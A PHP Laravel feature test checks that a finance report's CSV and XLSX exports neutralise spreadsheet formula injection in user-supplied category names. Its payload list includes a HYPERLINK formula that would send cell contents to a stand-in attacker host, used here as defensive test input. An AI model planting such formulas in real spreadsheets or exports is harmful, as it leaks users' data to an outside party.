<?php

declare(strict_types=1);

namespace Tests\Feature\Api;

use App\Models\Account;
use App\Models\Transaction;
use App\Models\TransactionCategory;
use App\Models\TransactionType;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Laravel\Sanctum\Sanctum;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TestCase;

class ExportFormulaInjectionTest extends TestCase
{
    use RefreshDatabase;

    private const PAYLOADS = [
        '=HYPERLINK("http://evil.example/?c="&A1,"click")',
        '+SUM(1+1)',
        '-2+3',
        '@SUM(1)',
        "\tsneaky",
    ];

    protected function setUp(): void
    {
        parent::setUp();

        $user = User::factory()->create();
        $account = Account::factory()->create(['user_id' => $user->id]);
        $type = TransactionType::query()->firstOrCreate(['name' => 'Expenses'], ['is_income' => false]);

        foreach (self::PAYLOADS as $name) {
            $category = TransactionCategory::create(['user_id' => $user->id, 'name' => $name, 'is_active' => true]);
            Transaction::create([
                'user_id' => $user->id,
                'account_id' => $account->id,
                'transaction_type_id' => $type->id,
                'transaction_category_id' => $category->id,
                'amount' => 25,
                'date' => '2026-03-10',
                'description' => 'Spend',
            ]);
        }

        Sanctum::actingAs($user);
    }

    public function test_csv_cells_that_look_like_formulas_are_neutralised(): void
    {
        $content = $this->get('/api/v1/reports/finance/export?year=2026&format=csv')->assertOk()->streamedContent();

        $cells = collect(explode("\n", $content))
            ->flatMap(fn (string $line) => str_getcsv($line))
            ->filter(fn ($cell) => $cell !== null && $cell !== '');

        foreach ($cells as $cell) {
            if (is_numeric($cell)) {
                continue; // A negative amount is a number, not a formula.
            }

            $this->assertDoesNotMatchRegularExpression(
                '/^[=+\-@\t\r]/',
                (string) $cell,
                "The CSV cell [{$cell}] would be read as a formula by a spreadsheet."
            );
        }

        // The original text is still there, only prefixed.
        $this->assertStringContainsString("'=HYPERLINK", $content);
        $this->assertStringContainsString("'+SUM(1+1)", $content);
        $this->assertStringContainsString("'@SUM(1)", $content);
    }

    public function test_numbers_in_the_csv_are_left_alone(): void
    {
        $content = $this->get('/api/v1/reports/finance/export?year=2026&format=csv')->assertOk()->streamedContent();

        $this->assertStringContainsString('25', $content);
        $this->assertStringNotContainsString("'25", $content);
    }

    public function test_xlsx_cells_that_look_like_formulas_are_stored_as_text(): void
    {
        $content = $this->get('/api/v1/reports/finance/export?year=2026&format=xlsx')->assertOk()->getContent();

        $path = tempnam(sys_get_temp_dir(), 'xlsx');
        file_put_contents($path, $content);

        try {
            $spreadsheet = IOFactory::load($path);
        } finally {
            unlink($path);
        }

        $found = [];

        foreach ($spreadsheet->getAllSheets() as $sheet) {
            foreach ($sheet->getRowIterator() as $row) {
                foreach ($row->getCellIterator() as $cell) {
                    $value = $cell->getValue();

                    if (is_string($value) && preg_match('/^[=+\-@\t]/', $value) && ! is_numeric($value)) {
                        $found[] = $value;
                        $this->assertSame(DataType::TYPE_STRING, $cell->getDataType(), "The cell [{$value}] was stored as a formula.");
                    }
                }
            }
        }

        $this->assertNotEmpty($found, 'The malicious category names never reached the workbook.');
    }
}
